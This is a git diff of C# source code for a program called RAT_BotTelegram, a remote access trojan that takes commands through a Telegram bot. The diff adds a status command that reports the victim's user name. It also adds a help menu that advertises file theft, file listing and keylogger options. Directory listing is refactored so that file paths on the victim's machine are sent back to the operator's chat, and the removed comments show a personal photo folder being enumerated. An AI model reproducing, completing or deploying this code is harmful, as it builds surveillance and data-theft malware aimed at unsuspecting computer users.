@@ -2,6 +2,8 @@
 using System;
 using System.IO;
 using System.Linq;
+using System.Reflection;
+using System.Security.Cryptography.X509Certificates;
 using System.Threading.Tasks;
 using Telegram.Bot;
 using Telegram.Bot.Args;
@@ -28,7 +30,9 @@ namespace RAT_BotTelegram {
             Bot.OnReceiveError += BotOnReceiveError;
 
             // Mensaje de conexión
-            Bot.SendTextMessageAsync(config.id, "==>>    Computer: SebastiánEPH is online    <<== ");
+
+            Bot.SendTextMessageAsync(config.id, "==>>    Computer: "+Features.getUserName()+" is online    <<== ");
+
 
             // Escucha servidor
             Bot.StartReceiving();
@@ -44,20 +48,50 @@ namespace RAT_BotTelegram {
 
             switch (message.Text.Split(' ').First()) {
                 //Enviar un inline keyboard con callback
+
+                //  /PC_Info      <Obtiene información de la computadora>
+                //  /PC_ShutDown  <Está en desarrollo>
+                //  /PC_Restart   <Está en desarrollo>
+                //  /Get_Document <Está en desarrollo>
+                //  /Get_Music    <Está en desarrollo>
+                //  /Get_Download <Está en desarrollo>
+                //  /Get_Videos   <Está en desarrollo>
+                //  /Get_Pictures <Está en desarrollo>
+                //  /Get_Desktop  <Está en desarrollo>
+                //  /Get_Key      <Está en desarrollo>
+
+                //  /GetDir_Document <Obtiene toda la lista>
+                //  /GetDir_Music    <Está en desarrollo>
+                //  /GetDir_Download <Está en desarrollo>
+                //  /GetDir_Videos   <Está en desarrollo>
+                //  /GetDir_Pictures <Está en desarrollo>
+                //  /Get_Desktop  <Está en desarrollo>
+                //  /Get_Key      <Está en desarrollo>
+
+
+
+
+                case "/Status": // Verifica Si la PC se encuentra en linea
+                    await Bot.SendTextMessageAsync(config.id, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
+                    break;
                 case "/PC_Info":
+                    
                     await Bot.SendTextMessageAsync(config.id, Tools.PC_Info());
                     break;
 
                 case "/GetDir_Document":
                     await Bot.SendTextMessageAsync(config.id, "Espere, obteniendo datos...");
-                    string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
+                    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
                     //string[] authorsList = authors.Split(", ")
-                    foreach (var file in allfiles) {
+
+
+                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                         FileInfo info = new FileInfo(file);
                         Console.WriteLine("File: " + info);
-                        await  Bot.SendTextMessageAsync(config.id, "File =>" + info);
+                        await  Bot.SendTextMessageAsync(config.id, file);
+
                         //await  Bot.SendDocumentAsync(id,SendDocumentRequest);
-                     //await Bot.SendDocumentAsync(chatId: config.id,);
+                        //await Bot.SendDocumentAsync(chatId: config.id,);
                         //await Bot.SendDocumentAsync(
                         //chatId: callbackQuery.Message.Chat.Id,
                         //document: "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf"
@@ -108,37 +142,38 @@ namespace RAT_BotTelegram {
 
                 //Mensaje por default
                 default:
-                    const string usage = 
-                  @" Use los siguientes comandos: 
-                    /PC_Info      <Obtiene información de la computadora>
-                    /PC_ShutDown  <Está en desarrollo>
-                    /PC_Restart   <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Music    <Está en desarrollo>
-                    /Get_Download <Está en desarrollo>
-                    /Get_Videos   <Está en desarrollo>
-                    /Get_Pictures <Está en desarrollo>
-                    /Get_Desktop  <Está en desarrollo>
-                    /Get_Key      <Está en desarrollo>
-
-                    /GetDir_Document <Obtiene toda la lista>
-                    /GetDir_Music    <Está en desarrollo>
-                    /GetDir_Download <Está en desarrollo>
-                    /GetDir_Videos   <Está en desarrollo>
-                    /GetDir_Pictures <Está en desarrollo>
-                    /Get_Desktop  <Está en desarrollo>
-                    /Get_Key      <Está en desarrollo>
-
-                    /Test         <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>
-                    /Get_Document <Está en desarrollo>";
+                    const string usage =
+                  "________________________________\n" +
+                  " * Use the following commands: *\n" +
+                  "°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n" +
+                  "\n/Status            <Check if the PC is online>" +
+                  "\n/Get_Information <get detailed system information>" +
+                  "\n/Get_Files       |Menu| <Get Files from Computer>" +  // Obtiene los archivos dentro de la computadora
+                  "\n/Get_DirFiles    |Menu| <Get list of file names>" +   // Obtiene los nombres dentro de la computadora
+                  "\n/Keylogger       |Menu| <keylogger Options >" +  
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "\n" +
+                  "";
 
                     await Bot.SendTextMessageAsync(config.id,text: usage,replyMarkup: new ReplyKeyboardRemove());
                     break;
@@ -267,32 +302,20 @@ namespace RAT_BotTelegram {
             if (e.Message.Type == Telegram.Bot.Types.Enums.MessageType.Text) {
 
                 if (e.Message.Text == "/PC_Info") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, fea.PC_Info());
-                } else if (e.Message.Text == "/PC_ShutDown") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
-                } else if (e.Message.Text == "/PC_Restart") {
-                    Bot.SendTextMessageAsync(e.Message.Chat.Id, "Se está desarrollando... Espere las proximas actualizaciones");
+                    Bot.SendTextMessageAsync(e.Message.Chat.Id, Tools.PC_Info());
 
                 } else if (e.Message.Text == "/GetDir_Document") {
-                    /*
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0064.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0081.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0082.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0083.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0099.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0102.mp4
-                    File: O:\OneDrive - xKx\Pictures\Álbum de la cámara\2020\VID - 20200116 - WA0103.mp4
 
-                    */
 
 
                     //string[] allfiles = fea.GetFile(@"O:\OneDrive - xKx\Pictures")
-                    string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
+                    //string[] allfiles = Directory.GetFiles(@"O:\Estoo", "*.*", SearchOption.AllDirectories);
+                    //Tools.GetFile(@"O:\Estoo");
                     //string[] authorsList = authors.Split(", ")
-                    foreach (var file in allfiles) {
+                    foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                         FileInfo info = new FileInfo(file);
                         Console.WriteLine("File: " + info);
-                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "" + info);
+                        Bot.SendTextMessageAsync(e.Message.Chat.Id, "" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
                         // Bot.SendDocumentAsync(e.Message.Document.);
                         // Do something with the Folder or just add them to a list via nameoflist.add();
 
@@ -300,8 +323,6 @@ namespace RAT_BotTelegram {
 
          
                 }
-
-
 
 
             }
